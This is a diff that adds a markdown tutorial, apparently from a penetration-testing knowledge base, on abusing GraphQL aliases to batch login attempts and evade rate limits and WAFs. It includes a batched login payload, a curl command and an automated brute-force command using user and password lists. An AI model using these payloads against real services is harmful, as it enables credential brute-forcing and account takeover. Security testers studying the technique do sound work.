@@ -1,0 +1,95 @@
+---
+title: Exploit GraphQL with Query Name Based Batching
+description: Learn how to exploit GraphQL endpoints using query name based batching
+  for increased efficiency and bypassing security controls.
+keywords:
+- GraphQL batching
+- query name batching
+- GraphQL aliasing
+- cybersecurity
+- batching attacks
+- GraphQL vulnerabilities
+- HTTP request crafting
+---
+
+# Query Name Based Batching
+
+## Context
+
+The objective of this article is to demonstrate how to exploit GraphQL endpoints using query name based batching. This technique allows attackers to execute multiple operations in a single request, effectively bypassing security controls and enhancing attack efficiency. To fully understand and implement this attack, you should be familiar with GraphQL query and mutation syntax, crafting HTTP requests, and basic GraphQL injection techniques.
+
+## Theory
+
+### Alias-Based Batching in GraphQL
+
+Query name based batching exploits the aliasing feature of GraphQL to submit multiple operations within a single request. Each alias represents a unique operation, facilitating parallel execution in one HTTP request. By using aliases strategically, attackers can craft GraphQL requests that contain multiple queries or mutations, thus significantly impacting the target by increasing the volume of operations processed simultaneously.
+
+### Security Implications of Query Name Based Batching
+
+Query name based batching can bypass common security mechanisms like rate limits, logging, and web application firewalls (WAFs), which typically expect one operation per request. This leveraging of GraphQL's flexible aliasing allows attackers to effectively mask brute-force or enumeration attempts, posing a significant risk to application security.
+
+### Detection and Prevention Challenges
+
+Many GraphQL implementations fail to restrict the number of aliases or operations permitted in a single request. This lack of restriction presents an opportunity for attackers to execute batch attacks without triggering typical security controls designed for single-operation requests. Consequently, the security filters focusing on non-batched requests may fail to detect such malicious activity, offering attackers a way to exploit GraphQL endpoints efficiently.
+
+## Practice
+
+### Manual Query Name Based Batching Exploitation
+
+This method involves crafting a GraphQL request that utilizes multiple aliases to batch operations, thereby increasing the attack throughput.
+
+- **Craft a GraphQL Request**: The request should use aliases to include multiple operations in one:
+  
+  ```graphql
+  {
+    a1: login(username: "admin1", password: "pass1") { token }
+    a2: login(username: "admin2", password: "pass2") { token }
+    a3: login(username: "admin3", password: "pass3") { token }
+  }
+  ```
+
+  This payload attempts three login operations simultaneously in one HTTP request.
+
+- **Send the Batched Query**:
+  
+  ```bash
+  curl -X POST https://target/graphql -H 'Content-Type: application/json' --data '{"query":"{ a1: login(username: \\"admin1\\", password: \\"pass1\\") { token } a2: login(username: \\"admin2\\", password: \\"pass2\\") { token } a3: login(username: \\"admin3\\", password: \\"pass3\\") { token } }"}'
+  ```
+
+  Execution of this command submits the batched query to the GraphQL endpoint.
+
+- **Review the Response**:
+
+  ```json
+  {
+    "data": {
+      "a1": {"token": null},
+      "a2": {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"},
+      "a3": {"token": null}
+    }
+  }
+  ```
+
+  The response indicates which login attempts, if any, were successful, showcasing which credentials might have been correctly brute-forced or discovered.
+
+### Automated Alias-Based Brute Force with GraphQL Tools
+
+For more advanced batch attacks, an automated approach using specialized tools enhances the scale and speed of the assault.
+
+- **Automate the Attack**:
+  
+  Run a tool like `graphql-batcher` to automate alias-based brute-force attempts:
+
+  ```bash
+  python graphql-batcher.py --endpoint https://target/graphql --userlist users.txt --passwordlist passwords.txt --batch-size 5
+  ```
+
+  This command performs a high-volume batch brute-force attack by trying multiple credentials simultaneously with the specified batch size.
+
+## Tools
+
+- **Burp Suite**
+- **graphql-batcher**
+- **curl** 
+
+These tools assist in manually or automatically crafting and executing batched GraphQL payloads to test for vulnerabilities effectively.
